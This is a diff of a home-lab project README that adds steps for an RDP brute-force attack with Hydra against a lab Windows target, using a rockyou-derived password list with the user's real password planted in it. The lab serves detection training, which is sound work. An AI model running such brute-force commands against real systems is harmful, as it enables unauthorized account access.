@@ -330,13 +330,19 @@ In this section, we will launch brute force attacks in Kali Linux to generate te
   - sudo apt install hydra
   - You can find more information on Hydra tool on this page: https://www.kali.org/tools/hydra/
 #### Launching RDP Brute Force attacks to Target-PC through Hydra
-- Create a folder "ad-project" and create a passwords.txt file
+- <b> Create a folder "ad-project" and create a passwords.txt file </b>
    - mkdir ad-project &nbsp; &nbsp;&nbsp; &nbsp; -- <i> (Making a foldeer called ad-project) </i>
    - cd /usr/share/wordlist/ &nbsp;&nbsp; &nbsp; &nbsp; -- <i> (Going to the folder wordlist which contains rockyou file for passwords) </i>
    - sudo gunzip rockyou.txt.gz &nbsp; &nbsp;&nbsp; &nbsp; -- <i> (Unzipping rockyou.tzt.gz to get the rockyou.txt file) </i>
    - cp rockyou.txt ~/ad-project &nbsp; &nbsp;&nbsp; &nbsp; -- <i> (Copying rockyou.txt to our project's folder) </i>
    - cd /ad-project &nbsp; &nbsp;&nbsp; &nbsp; -- <i> (Go to ad-project directory) </i>
    - head -n 20 rockyou.txt > passwords.txt &nbsp; &nbsp;&nbsp; &nbsp; -- <i> (To use the first 20 passwords and input it into a new file "passwords.txt") </i>
+   - In our scenario, we want to target a specific password for specific users. So let's add in the correct password for the user jsmith in passwords.txt file.
+   - vi passwords.txt
+   - Add in the password which you have created for jsmith at the end (after 20 lines) and save the file
+- <b> Launching the attack to our Target-PC using hydra tool </b>
+   - Here is the command to launch the attack to our Target-PC
+   - hydra -l jsmith  -P passwords.txt -f rdp://172.31.40.34 -v   </br> <i> hydra </i> is the tool </br> <i> -l </i> is to use a single username </br> <i> jsmith </i> is the username </br> <i> -P </i> is to use a password file </br> <i>-f</i> implies to stop this attack once it finds the correct password </br> <i>rdp://172.31.40.34</i> is to target the rdp port of the private ip of the Target-PC </br> <i>-v</i> is to run it in verbose mode.
 
 ## Conclusion: 
 This project provided valuable hands-on experience in building and managing a security lab within AWS, simulating real-world attack scenarios, and gaining deep insights into network and domain security. By integrating tools like Splunk, Kali Linux, and Atomic Red Team, the project not only deepened understanding of Active Directory but also significantly enhanced the ability to detect and respond to modern cyber threats. The ability to monitor and analyze security events within a simulated attack environment has reinforced key skills in security operations, threat detection, and incident response, which will be crucial for securing networks and systems in real-world scenarios.
